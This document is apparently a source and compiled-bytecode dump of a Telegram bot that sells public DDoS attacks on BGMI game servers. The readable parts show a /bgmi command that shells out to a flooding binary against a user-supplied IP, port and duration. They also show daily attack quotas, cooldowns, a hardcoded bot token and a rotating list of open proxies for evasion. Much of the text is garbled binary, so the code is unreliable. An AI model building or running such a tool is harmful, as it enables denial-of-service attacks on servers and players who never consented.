import subprocess
import json
import os
import random
import string
import datetime
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from config import BOT_TOKEN, ADMIN_IDS, OWNER_USERNAME

    �ig�1  �                   �  � d dl Z d dlZd dlZd dlZd dlmZmZmZ  ej                  dej                  ��       dZ	dZ
 ej                  e	�      Zi a
i ai ai a ej"                  �       j%                   e edd�	�      �      �      j'                  d d d d �
�      adZ ed��      ZdZd
gZd� Zg d�Zd� Zej9                  dg��      d� �       Zd� Zd� Zd� Z ej9                  dg��      d� �       Z!ej9                  dg��      d� �       Z"d� Z#e$dk(  r& ejJ                  d�       	 ejM                  d� �       yy# e'$ rZ( ejR                  d!e(� ��       Y dZ([(ydZ([(ww xY w)"�    N)�datetime�	timedelta�timezonez4%(asctime)s - %(name)s - %(levelname)s - %(message)s)�format�levelz.7563952518:AAHlX0T5IJ0AtoFIye3L_Kvtp7c9oaenM8U-1002368955859�   �   ��hours�minutes��hour�minute�second�microsecondi,  )r   l   ^<�f c                  �  � t        j                  t        j                  �      j	                  t        t        dd��      �      �      } | t        t        d��      z   k\  rst        j                  �        t        j                  �        t        j                  �        t        j                  �        | j                  dddd��      t        d��      z   ayy)	z:Reset the daily attack counts and other data at 12 AM IST.r   r	   r
   �   )�daysr   r
   N)
r   �nowr   �utc�
astimezoner   �
reset_time�user_attacks�clear�user_cooldowns�user_photos�	user_bans�replace)�ist_nows    �mrin.py�reset_daily_countsr!      s�   � � �l�l�8�<�<�(�3�3�H�Y�Q�XZ�=[�4\�]�G��*�y�a�0�0�0������������������_�_�!�A�a�Q�_�O�R[�ab�Rc�c�
� 1�    )N�https://43.134.234.74:443�https://175.101.18.21:5678r#   r$   zhttps://179.189.196.52:5678zhttps://162.247.243.29:80zhttps://173.244.200.154:44302zhttps://173.244.200.156:64631zhttps://207.180.236.140:51167zhttps://123.145.4.15:53309zhttps://36.93.15.53:65445zhttps://1.20.207.225:4153zhttps://83.136.176.72:4145zhttps://115.144.253.12:23928zhttps://78.83.242.229:4145zhttps://128.14.226.130:60080zhttps://194.163.174.206:16128zhttps://110.78.149.159:4145zhttps://190.15.252.205:3629zhttps://101.43.191.233:2080zhttps://202.92.5.126:44879zhttps://221.211.62.4:1111zhttps://58.57.2.46:10800zhttps://45.228.147.239:5678zhttps://43.157.44.79:443zhttps://103.4.118.130:5678zhttps://37.131.202.95:33427zhttps://172.104.47.98:34503zhttps://216.80.120.100:3820zhttps://182.93.69.74:5678zhttps://8.210.150.195:26666zhttps://49.48.47.72:8080zhttps://37.75.112.35:4153zhttps://8.218.134.238:10802zhttps://139.59.128.40:2016zhttps://45.196.151.120:5432zhttps://24.78.155.155:9090zhttps://212.83.137.239:61542zhttps://46.173.175.166:10801zhttps://103.196.136.158:7497zhttps://82.194.133.209:4153zhttps://210.4.194.196:80zhttps://88.248.2.160:5678zhttps://116.199.169.1:4145zhttps://77.99.40.240:9090zhttps://143.255.176.161:4153zhttps://172.99.187.33:4145zhttps://43.134.204.249:33126zhttps://185.95.227.244:4145zhttps://197.234.13.57:4145zhttps://81.12.124.86:5678zhttps://101.32.62.108:1080zhttps://192.169.197.146:55137zhttps://82.117.215.98:3629zhttps://202.162.212.164:4153zhttps://185.105.237.11:3128zhttps://123.59.100.247:1080zhttps://192.141.236.3:5678zhttps://182.253.158.52:5678zhttps://164.52.42.2:4145zhttps://185.202.7.161:1455zhttps://186.236.8.19:4145zhttps://36.67.147.222:4153zhttps://118.96.94.40:80zhttps://27.151.29.27:2080zhttps://181.129.198.58:5678zhttps://200.105.192.6:5678zhttps://103.86.1.255:4145zhttps://171.248.215.108:1080zhttps://181.198.32.211:4153zhttps://188.26.5.254:4145zhttps://34.120.231.30:80zhttps://103.23.100.1:4145zhttps://194.4.50.62:12334zhttps://201.251.155.249:5678zhttps://37.1.211.58:1080zhttps://86.111.144.10:4145zhttps://80.78.23.49:1080c                  �   � t         j                  t        �      } d| it        j                  _        t
        j                  d| � ��       y)z*Select a random proxy from the proxy list.�httpszProxy updated to: N)�random�choice�
proxy_list�telebot�	apihelper�proxy�logging�info)r,   s    r    �update_proxyr/   J   s7   � ��M�M�*�%�E�&��.�G�����L�L�%�e�W�-�.r"   r/   )�commandsc                 ��   � | j                   j                  }	 t        �        t        j	                  |d�       y# t
        $ r#}t        j	                  |d|� ��       Y d}~yd}~ww xY w)z,Command to update the proxy used by the bot.zProxy updated successfully.zFailed to update proxy: N)�chat�idr/   �bot�send_message�	Exception)�message�chat_id�es      r    �update_proxy_commandr:   P   sZ   � � �l�l�o�o�G�B�������"?�@��� B�����$<�Q�C�"@�A�A��B�s   � 9 �	A%�A � A%c                 �h   � | j                  d�      }t        |�      dk(  xr t        d� |D �       �      S )N�.�   c              3   �r   K  � | ]/  }|j                  �       xr d t        |�      cxk  xr dk  nc �� �1 y�w)r   ��   N��isdigit�int)�.0�parts     r    �	<genexpr>zis_valid_ip.<locals>.<genexpr>^   s-   � �� �"^�PT�4�<�<�>�#K�a�3�t�9�6K��6K�#K�"^�s   �57)�split�len�all)�ip�partss     r    �is_valid_iprK   \   s.   � ��H�H�S�M�E��u�:��?�^�s�"^�X]�"^�^�^r"   c                 �X   � | j                  �       xr dt        | �      cxk  xr dk  S c S )Nr   i��  r@   )�ports    r    �
is_valid_portrN   a   s'   � ��<�<�>�5�a�3�t�9�5��5�5�5�5r"   c                 �B   � | j                  �       xr t        | �      dkD  S )Nr   r@   )�durations    r    �is_valid_durationrQ   e   s   � �����3�#�h�-�!�"3�3r"   �photo)�
content_typesc                 �B   � | j                   j                  }dt        |<   y )NT)�	from_userr3   r   )r7   �user_ids     r    �handle_photorW   i   s   � ����"�"�G��K��r"   �bgmic                 �d	  � | j                   j                  }| j                   j                  xs d}t        | j                  j                  �      t
        k7  r+t        j                  | j                  j                  d�       y t        �        |t        v r�t        |   }t        j                  �       |k  r�|t        j                  �       z
  j                  �       }t        |d�      \  }}t        j                  | j                  j                  d| j                   j                  � dt        |�      � dt        |�      � d��       y t        |= |t        v�r�|t         v r�t         |   }t        j                  �       |k  rp|t        j                  �       z
  j"                  }t        j                  | j                  j                  d| j                   j                  � d|dz  � d|dz  � d	��       y |t$        vr	d
t$        |<   t$        |   t&        k\  rCt        j                  | j                  j                  d| j                   j                  � d��       y |t$        v r�t$        |   d
kD  r{t(        j+                  |d
�      set        j                  �       t,        z   t        |<   t        j                  | j                  j                  d| j                   j                  � d��       y 	 | j.                  j1                  �       dd  }	t3        j4                  d|	� ��       t7        |	�      dk7  rt9        d�      �|	\  }
}}t;        |
�      st9        d�      �t=        |�      st9        d�      �t?        |�      st9        d�      �|t        vrt$        |xx   dz
  cc<   d
t(        |<   |t        vr,t        j                  �       tA        tB        ��      z   t         |<   d}
t        j                  | j                  j                  d| j                   j                  � d|
� d|� d|
� d|� d��       t3        j4                  d|� d|
� d |� d |
� d!�	�       tE        jF                  tI        |
t        |�      |
||�      �       y # tJ        $ r=}t        j                  | j                  j                  t        |�      �       Y d }~y d }~ww xY w)"N�Unknownu�    ⚠️⚠️ This bot is not authorized to be used here ⚠️⚠️ 

 | [ DON'T BE OVERSMART @TG_FLASH92 BAP HAI TUMHARA BKL ] |�<   u   ⚠️⚠️ 𝙃𝙞 u�   , 𝙔𝙤𝙪 𝙖𝙧𝙚 𝙗𝙖𝙣𝙣𝙚𝙙 𝙛𝙤𝙧 𝙣𝙤𝙩 𝙥𝙧𝙤𝙫𝙞𝙙𝙞𝙣𝙜 𝙛𝙚𝙚𝙙𝙗𝙖𝙘𝙠. 𝙋𝙡𝙚𝙖𝙨𝙚 𝙬𝙖𝙞𝙩 u+    𝙢𝙞𝙣𝙪𝙩𝙚𝙨 𝙖𝙣𝙙 ut    𝙨𝙚𝙘𝙤𝙣𝙙𝙨 𝙗𝙚𝙛𝙤𝙧𝙚 𝙩𝙧𝙮𝙞𝙣𝙜 𝙖𝙜𝙖𝙞𝙣 !  ⚠️⚠️u�   , 𝙮𝙤𝙪 𝙖𝙧𝙚 𝙘𝙪𝙧𝙧𝙚𝙣𝙩𝙡𝙮 𝙤𝙣 𝙘𝙤𝙤𝙡𝙙𝙤𝙬𝙣. 𝙋𝙡𝙚𝙖𝙨𝙚 𝙬𝙖𝙞𝙩 ur    𝙨𝙚𝙘𝙤𝙣𝙙𝙨 𝙗𝙚𝙛𝙤𝙧𝙚 𝙩𝙧𝙮𝙞𝙣𝙜 𝙖𝙜𝙖𝙞𝙣 ⚠️⚠️ r   u	   𝙃𝙞 u"  , 𝙮𝙤𝙪 𝙝𝙖𝙫𝙚 𝙧𝙚𝙖𝙘𝙝𝙚𝙙 𝙩𝙝𝙚 𝙢𝙖𝙭𝙞𝙢𝙪𝙢 𝙣𝙪𝙢𝙗𝙚𝙧 𝙤𝙛 𝙖𝙩𝙩𝙖𝙘𝙠-𝙡𝙞𝙢𝙞𝙩 𝙛𝙤𝙧 𝙩𝙤𝙙𝙖𝙮, 𝘾𝙤𝙢𝙚𝘽𝙖𝙘𝙠 𝙏𝙤𝙢𝙤𝙧𝙧𝙤𝙬 ✌️Fu�  , ⚠️⚠️𝙔𝙤𝙪 𝙝𝙖𝙫𝙚𝙣'𝙩 𝙥𝙧𝙤𝙫𝙞𝙙𝙚𝙙 𝙛𝙚𝙚𝙙𝙗𝙖𝙘𝙠 𝙖𝙛𝙩𝙚𝙧 𝙮𝙤𝙪𝙧 𝙡𝙖𝙨𝙩 𝙖𝙩𝙩𝙖𝙘𝙠. 𝙔𝙤𝙪 𝙖𝙧𝙚 𝙗𝙖𝙣𝙣𝙚𝙙 𝙛𝙧𝙤𝙢 𝙪𝙨𝙞𝙣𝙜 𝙩𝙝𝙞𝙨 𝙘𝙤𝙢𝙢𝙖𝙣𝙙 𝙛𝙤𝙧 30 𝙢𝙞𝙣𝙪𝙩𝙚𝙨 ⚠️⚠️r   zReceived arguments: �   u+  FLASH™ 𝗣𝗨𝗕𝗟𝗜𝗖 𝗗𝗱𝗢𝗦 𝗔𝗖𝗧𝗜𝗩𝗘 ✅ 

 ⚙ 𝙋𝙡𝙚𝙖𝙨𝙚 𝙪𝙨𝙚 𝙩𝙝𝙚 𝙛𝙤𝙧𝙢𝙖𝙩
 /𝗯𝗴𝗺𝗶 <𝘁𝗮𝗿𝗴𝗲𝘁_𝗶𝗽> <𝘁𝗮𝗿𝗴𝗲𝘁_𝗽𝗼𝗿𝘁> <𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻>zInvalid IP address.zInvalid port number.z-Invalid duration. Must be a positive integer.)�seconds�   u
   🚀𝙃𝙞 uA   , 𝘼𝙩𝙩𝙖𝙘𝙠 𝙨𝙩𝙖𝙧𝙩𝙚𝙙 𝙤𝙣 � : u    𝙛𝙤𝙧 uW    𝙨𝙚𝙘𝙤𝙣𝙙𝙨 [ 𝙊𝙧𝙞𝙜𝙞𝙣𝙖𝙡 𝙞𝙣𝙥𝙪𝙩: u�    𝙨𝙚𝙘𝙤𝙣𝙙𝙨 ] 

❗️❗️ 𝙋𝙡𝙚𝙖𝙨𝙚 𝙎𝙚𝙣𝙙 𝙁𝙚𝙚𝙙𝙗𝙖𝙘𝙠 ❗️❗️zAttack started by z	: ./bgmi � z 200)&rU   r3   �
first_name�strr2   �
CHANNEL_IDr4   r5   r!   r   r   r   �
total_seconds�divmodrB   �EXEMPTED_USERSr   r]   r   �DAILY_ATTACK_LIMITr   �get�BAN_DURATION�textrF   r-   r.   rG   �
ValueErrorrK   rN   rQ   r   �COOLDOWN_DURATION�asyncio�run�run_attack_command_asyncr6   )r7   rV   �	user_name�
ban_expiry�remaining_ban_timer   r]   �
cooldown_time�remaining_time�args�	target_ip�target_port�
user_duration�default_durationr9   s                  r    �bgmi_commandrz   n   s�  � � ���"�"�G��!�!�,�,�9�	�I� �7�<�<�?�?��z�)���������  +r�  	s�� �� �)���w�'�
��<�<�>�J�&�",�x�|�|�~�"=�!L�!L�!N��%�&8�"�=��G�W���������(��):�):�)E�)E�(F�  GG�  HK�  LS�  HT�  GU�  U@�  AD�  EL�  AM�  @N�  NB�  C�
� 
��'�"� �n�$��n�$�*�7�3�M��|�|�~�
�-�"/�(�,�,�.�"@�!I�!I��� � ��L�L�O�O�,�W�->�->�-I�-I�,J�  Ka�  bp�  tv�  bv�  aw�  wb�  cq�  tv�  cv�  bw�  wi�  j�� � �,�&�$%�L��!��� �$6�6����������G�-�-�8�8�9�  :\�  ]�
� 
� �l�"�|�G�'<�q�'@����Y`�bg�Ih�!)����,�!>�I�g�����������G�-�-�8�8�9�  :B�  C�
� 
�(2��|�|�!�!�#�A�B�'�����+�D�6�2�3��t�9��>��  N�  O�  
O�04�-�	�;�
� �9�%��2�3�3��[�)��3�4�4� ��/��L�M�M� �.�(���!�Q�&�!�#(�K�� � �.�(�&.�l�l�n�y�IZ�7[�&[�N�7�#� ������L�L�O�O��G�-�-�8�8�9�9z�  |E�  {F�  FI�  JU�  IV�  Vd�  eu�  dv�  vM�  N[�  M\�  \d�  
e�	
� 	���)�)��I�i�[��+��VW�Xh�Wi�im�n�o� 	���,�Y��K�8H�JZ�\i�kt�u�v��� 2���������#�a�&�1�1��2�s   �F	Q) �)	R/�23R*�*R/c           
   �   �F  K  � 	 d| � d|� d|� d�}t        j                  |�      � d {  ��� }|j                  �       � d {  ���  t        j	                  t
        d| � d|� d|� d��       y 7 �A7 �+# t        $ r'}t        j	                  t
        d|� ��       Y d }~y d }~ww xY w�w)	Nz./bgmi r`   z 180u'   🚀 𝘼𝙩𝙩𝙖𝙘𝙠 𝙤𝙣 r_   u`     𝙛𝙞𝙣𝙞𝙨𝙝𝙚𝙙 ✅ [ 𝙊𝙧𝙞𝙜𝙞𝙣𝙖𝙡 𝙞𝙣𝙥𝙪𝙩: u�    𝙨𝙚𝙘𝙤𝙣𝙙𝙨.

𝗧𝗵𝗮𝗻𝗸𝗬𝗼𝘂 𝗙𝗼𝗿 𝘂𝘀𝗶𝗻𝗴 𝗢𝘂𝗿 𝗦𝗲𝗿𝘃𝗶𝗰𝗲 <> 𝗧𝗲𝗮𝗺 FLASH™zError running attack command: )rm   �create_subprocess_shell�communicater4   r5   rc   r6   )rv   rw   rP   rx   rp   �command�processr9   s           r    ro   ro   �   s�   � �� �K��I�;�a��}�A�h�Z�t�D���7�7��@�@���!�!�#�#�#�����'N�y�k�Y\�]h�\i�  jJ�  KX�  JY�  Yk�  &l�  	m� A��#��� K�����'E�a�S�%I�J�J��K�sP   �B!�$A. �A*�A. � A,�(A. �)B!�*A. �,A. �.	B�7B�B!�B�B!�__main__zBot is starting...T)�	none_stopzAn error occurred: )*�osr*   r-   rm   r   r   r   �basicConfig�INFO�TOKENrc   �TeleBotr4   r   r   r   r   r   r   r   r   rl   ri   rg   rf   r!   r)   r/   �message_handlerr:   rK   rN   rQ   rW   rz   ro   �__name__r.   �pollingr6   r9   �error� r"   r    �<module>r�      s�  �� 	� � � � 2� 2� �� � �Q�Y`�Ye�Ye� f� 	9��
